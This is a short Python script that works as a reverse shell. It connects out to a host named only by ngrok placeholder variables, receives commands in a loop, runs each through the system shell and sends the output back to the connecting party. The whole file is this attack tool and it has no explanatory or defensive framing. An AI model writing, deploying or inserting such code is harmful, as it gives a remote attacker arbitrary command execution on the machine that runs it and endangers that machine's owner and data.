import socket, subprocess
ip = ngroklink
port = ngrokport
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
while True:
    try:
        command = s.recv(8000)
        p1 = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, errori = p1.communicate()
        s.send(output.encode())
    except:
        s.send("An error are occured with execute the command".encode())
        